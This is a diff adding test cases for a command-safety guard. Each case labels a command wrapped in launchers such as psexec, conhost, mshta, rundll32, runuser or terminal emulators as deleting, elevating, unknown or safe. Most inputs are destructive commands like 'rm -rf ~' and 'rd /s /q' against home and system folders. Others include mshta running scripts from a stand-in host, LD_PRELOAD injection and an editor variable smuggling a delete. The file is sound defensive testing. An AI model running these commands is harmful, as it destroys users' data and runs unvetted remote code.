@@ -1,0 +1,232 @@
+# A program that starts the command after its own options hands that
+# command on, and the command is judged as one written alone. An option the
+# guard does not know may take the word after it, so the command is not read
+# past it. The format is in CONTRIBUTING.md.
+
+# Windows' console host runs the command line after its options.
+cmd finds=delete reason="deletes your home directory" | conhost cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | conhost.exe --headless --width 80 --height 24 cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | conhost -- cmd /c rd /s /q C:\\Users\\me
+powershell finds=delete | conhost.exe powershell -c "Remove-Item -Recurse C:\\Users\\me"
+cmd finds=unreadable reason="runs a command after an option that cannot be read" | conhost --frobnicate cmd /c rd /s /q C:\\Users\\me
+cmd finds=unknown reason="runs a program only known when it runs" | conhost %CMD%
+cmd safe | conhost cmd /c dir
+
+# Windows Terminal: each new tab and pane runs the command after its
+# options, in the folder `-d` names; a `;` word sets the commands apart.
+cmd finds=delete | wt cmd /c rd /s /q C:\\Users\\me
+powershell finds=delete | wt.exe -w 0 nt cmd /c rd /s /q C:\\Users\\me
+powershell finds=delete | wt new-tab --title x pwsh -c "Remove-Item -Recurse C:\\Users\\me"
+cmd finds=delete reason="deletes a system folder" | wt -p Ubuntu -d C:\\ cmd /c rd /s /q Windows
+cmd finds=delete | wt nt cmd /c dir ; sp -H cmd /c rd /s /q C:\\Users\\me
+cmd finds=unreadable | wt --frobnicate x cmd /c rd /s /q C:\\Users\\me
+cmd safe | wt focus-tab -t 0
+cmd safe | wt -w 0 nt -p PowerShell
+cmd safe | wt nt cmd /c dir
+
+# PsExec (and PsExec64, and PAExec) runs the program through a service it
+# installs, as an administrator, here or on the computer it names.
+cmd finds=delete,elevated | psexec cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | psexec -s -accepteula cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | PsExec64 -s cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | paexec -s cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | psexec \\\\server -u admin -p pw -i 1 -s cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | psexec /accepteula -i cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | psexec -w C:\\ cmd /c rd /s /q Windows
+cmd finds=unreadable,elevated | psexec -frobnicate cmd
+cmd rules=elevated | psexec -s notepad
+
+# gsudo reads its own options, and Windows' own sudo the options sudo has.
+cmd finds=delete,elevated | gsudo -i High cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | gsudo -n -w cmd /c rd /s /q C:\\Users\\me
+cmd finds=unreadable,elevated | gsudo --frobnicate x cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | sudo --inline cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete,elevated | sudo -E -N cmd /c rd /s /q C:\\Users\\me
+
+# NirSoft's nircmd runs a program, a line of cmd, or one of its own
+# commands that does.
+cmd finds=delete | nircmd exec hide cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | nircmdc execmd rd /s /q C:\\Users\\me
+cmd finds=delete | nircmd cmdwait 1000 exec hide cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | nircmd elevatecmd exec hide cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete reason="deletes a system folder" | nircmd exec2 hide C:\\ cmd /c rd /s /q Windows
+cmd safe | nircmd mutesysvolume 1
+
+# The Program Compatibility Assistant, and the functions of rundll32 that
+# start the program after them.
+cmd finds=delete | pcalua -a cmd.exe -c "/c rd /s /q C:\\Users\\me"
+cmd finds=delete reason="deletes a system folder" | pcalua -a cmd.exe -d C:\\ -c "/c rd /s /q Windows"
+cmd finds=delete | rundll32 shell32.dll,ShellExec_RunDLL cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | rundll32 url.dll,FileProtocolHandler cmd /c rd /s /q C:\\Users\\me
+cmd finds=delete | rundll32.exe zipfldr.dll,RouteTheCall cmd /c rd /s /q C:\\Users\\me
+cmd safe | rundll32 user32.dll,LockWorkStation
+
+# WMI's process class starts the command line it is given, as `wmic
+# process call create` does.
+powershell finds=unknown reason="starts a program through WMI" | Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c rd /s /q C:\\Users\\me"
+powershell finds=unknown reason="starts a program through WMI" | Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='notepad'}
+
+# toybox runs its applet, as busybox does.
+posix finds=delete reason="deletes your home directory" | toybox rm -rf ~
+
+# A queue runs the command later; an option that acts on the queue runs
+# none.
+posix finds=delete | tsp bash -c 'rm -rf ~'
+posix finds=delete | tsp -n -L job rm -rf ~
+posix finds=unreadable | tsp --frobnicate rm -rf ~
+posix finds=delete | nq -c rm -rf ~
+posix safe | tsp -l
+posix safe | tsp ls -l
+posix safe | nq -w
+
+# Session, display and container inits run the command after their
+# options.
+posix finds=delete | dbus-launch bash -c 'rm -rf ~'
+posix finds=delete | dbus-launch --exit-with-session rm -rf ~
+posix finds=delete | dbus-run-session -- rm -rf ~
+posix finds=delete | xvfb-run -a -s '-screen 0 1x1x8' rm -rf ~
+posix finds=delete | tini -s -- rm -rf ~
+posix finds=delete | dumb-init -c rm -rf ~
+posix safe | xvfb-run -a cargo test
+
+# As another user, with other limits, on other processors.
+posix finds=delete | runuser -u bob -- rm -rf ~
+posix finds=delete | runuser -l bob -c 'rm -rf ~'
+posix finds=delete | sg wheel -c 'rm -rf ~'
+posix finds=delete | sg - wheel 'rm -rf ~'
+posix finds=delete | setpriv --reuid=1000 --init-groups rm -rf ~
+posix finds=unreadable reason="runs a command after an option that cannot be read" | setpriv --frobnicate rm -rf ~
+posix finds=delete | numactl --interleave=all rm -rf ~
+posix finds=delete | numactl -N 0 -m 0 rm -rf ~
+posix finds=delete | cgexec -g cpu:x rm -rf ~
+posix finds=delete | capsh -- -c 'rm -rf ~'
+posix finds=delete | capsh --drop=cap_net_raw --shell=/bin/sh -- -c 'rm -rf ~'
+posix finds=delete | gosu bob rm -rf ~
+posix finds=delete | su-exec bob:bob rm -rf ~
+posix finds=delete | chpst -u bob rm -rf ~
+posix finds=delete reason="deletes a system folder" | chpst -C / rm -rf etc
+posix finds=unreadable,delete | chpst -/ /x rm -rf ~
+posix finds=delete | setuidgid bob rm -rf ~
+posix finds=delete | envdir ./env rm -rf ~
+posix finds=delete | softlimit -m 100 rm -rf ~
+posix finds=delete | setlock -n lock rm -rf ~
+posix finds=delete | pgrphack rm -rf ~
+posix safe | runuser bob
+posix safe | numactl --show
+posix safe | capsh --print
+posix safe | gosu bob ls
+
+# A toolbox runs the command in a container that shares the home
+# directory, or with `flatpak-spawn --host` outside the sandbox.
+posix finds=delete | flatpak-spawn --host rm -rf ~
+posix finds=delete reason="deletes a system folder" | flatpak-spawn --host --directory=/ rm -rf etc
+posix finds=delete | distrobox enter box -- rm -rf ~
+posix finds=delete | distrobox-enter -n box -- rm -rf ~
+posix finds=delete | toolbox run -c box rm -rf ~
+posix safe | distrobox create box
+posix safe | toolbox list
+
+# A terminal emulator runs the words after `-x` or `--`, and after `-e` the
+# words or the one line, as terminals differ.
+posix finds=delete | xterm -e 'rm -rf ~'
+posix finds=delete | xterm -T title -geometry 80x24 -e rm -rf ~
+posix finds=delete | gnome-terminal -- bash -c 'rm -rf ~'
+posix finds=delete | gnome-terminal --command='rm -rf ~'
+posix finds=delete | konsole -e rm -rf ~
+posix finds=delete | alacritty -e rm -rf ~
+posix finds=delete | xfce4-terminal -x rm -rf ~
+posix finds=delete | terminator -e 'rm -rf ~'
+posix safe | xterm
+posix safe | gnome-terminal --title x
+posix safe | xterm -e htop
+
+# mshta runs the code a `vbscript:` or `javascript:` URL holds, which is not
+# read, and the script an `http:` or `https:` URL downloads; a file is the
+# workspace's own.
+cmd finds=unknown reason="runs code the guard does not read" | mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c rd /s /q C:\\Users\\me"":close")
+cmd finds=unknown reason="runs code the guard does not read" | mshta javascript:alert(1)
+powershell finds=unknown | mshta "vbscript:Close(Execute(""x""))"
+cmd finds=run_downloaded reason="runs a downloaded script" | mshta https://x.example/a.hta
+powershell finds=run_downloaded | mshta http://x.example/a.hta
+cmd safe | mshta app.hta
+
+# rundll32 runs a function of a library, native code: only one known to do
+# nothing else is let through.
+cmd finds=unknown reason="runs code from a library" | rundll32 evil.dll,Entry
+cmd finds=unknown reason="runs code from a library" | rundll32 shell32.dll,Control_RunDLL x.cpl
+powershell finds=unknown | rundll32.exe C:\\x\\evil.dll,DllMain
+cmd safe | rundll32 shell32.dll,ShellExec_RunDLL notepad
+
+# `fc` runs again, or edits and runs, commands of the shell's history;
+# `fc -l` lists them. PowerShell's `Invoke-History` (`r`, `ihy`) runs one.
+posix finds=unknown reason="runs commands from the shell's history" | fc -s
+posix finds=unknown reason="runs commands from the shell's history" | fc -e 'rm -rf ~'
+posix finds=unknown | fc
+posix finds=unknown | fc -s ls=rm
+posix safe | fc -l
+posix safe | fc -ln -5
+powershell finds=unknown reason="runs commands from the shell's history" | Invoke-History 3
+powershell finds=unknown | r 3
+powershell finds=unknown | ihy
+
+# `sudo -e` (`--edit`) and `sudoedit` edit their operands as root: they run
+# no command of them, and the editor they start is the one their variables
+# name.
+posix rules=elevated,overwrite first=elevated finds=overwrite | sudo -e /etc/hosts
+posix first=elevated | sudoedit /etc/hosts
+
+posix finds=overwrite,elevated | sudoedit /etc/hosts
+posix finds=overwrite,elevated | sudo --edit /etc/sudoers
+posix finds=overwrite,elevated | sudo -u bob -e ~/.bashrc
+posix finds=delete,elevated | SUDO_EDITOR='rm -rf ~' sudo -e x
+posix rules=elevated | sudo -E ls
+
+# A library the line tells every program to load first: `LD_PRELOAD`,
+# `LD_AUDIT` and macOS's `DYLD_INSERT_LIBRARIES`, set in front of it, with
+# `env` or exported. An empty value loads none; a search path is not one.
+posix finds=unknown reason="loads a library into the program" | LD_PRELOAD=/tmp/x.so ls
+posix finds=unknown reason="loads a library into the program" | DYLD_INSERT_LIBRARIES=./x.dylib ls
+posix finds=unknown | export LD_PRELOAD=./x.so; ls
+posix finds=unknown | env LD_PRELOAD=x.so ls
+posix finds=unknown | LD_AUDIT=./a.so git status
+posix finds=unknown | LD_PRELOAD="$lib" ls
+posix safe | LD_PRELOAD= ls
+posix safe | LD_PRELOAD=x.so cd /
+posix safe | LD_LIBRARY_PATH=./lib ls
+
+# runuser hands the words after `--` to the shell, which runs the line after
+# a `-c`; pcalua's `-c` runs to its next option, quoted or not, and a
+# library it is given is native code; psexec's computers may follow its
+# options; nircmd's own commands that change the machine.
+posix finds=delete reason="deletes your home directory" | runuser -- root -c 'rm -rf ~'
+posix finds=delete | runuser root -- -c 'rm -rf ~'
+cmd finds=delete reason="deletes your home directory" | pcalua -a cmd.exe -c /c rd /s /q C:\\Users\\me
+cmd finds=unknown reason="runs code from a library" | pcalua -a x.dll
+cmd finds=delete,elevated | psexec -s \\\\server cmd /c rd /s /q C:\\Users\\me
+cmd finds=system_settings reason="changes the registry" | nircmd regdelkey HKLM\\Software\\x
+cmd finds=delete | nircmd filldelete C:\\Users\\me\\x.txt
+cmd finds=stop_system reason="shuts the computer down or restarts it" | nircmd exitwin poweroff
+
+# mshta: only a file on this machine's disk is the workspace's own; one on
+# another machine is a script it downloads, and any other scheme code the
+# guard does not read.
+cmd finds=unknown reason="runs code the guard does not read" | mshta about:"<script>x</script>"
+cmd finds=unknown | mshta file:///C:/x/a.hta
+cmd finds=unknown | mshta res://x.dll/a
+cmd finds=unknown | mshta mhtml:x
+cmd finds=unknown | mshta " vbscript:Close(1)"
+cmd finds=run_downloaded reason="runs a downloaded script" | mshta ftp://x.example/a.hta
+cmd finds=run_downloaded | mshta \\\\server\\share\\a.hta
+cmd safe | mshta C:\\x\\app.hta
+# `fc` and zsh's and ksh's `r` are the shell's own; `fc.exe` is Windows'
+# file compare. `history -w FILE` and `-a FILE` write the file.
+posix finds=unknown reason="runs commands from the shell's history" | r
+posix finds=unknown | r ls
+posix@windows safe | fc.exe a.txt b.txt
+posix safe | R -e 'print(1)'
+posix finds=overwrite reason="writes to a shell startup file" | history -w ~/.bashrc
+posix finds=overwrite | history -a /etc/x
+posix safe | history -c
+# PowerShell hands `user32.dll,LockWorkStation` to rundll32 as two words.
+powershell safe | rundll32 user32.dll,LockWorkStation
+powershell finds=unknown reason="runs code from a library" | rundll32 evil.dll,Entry
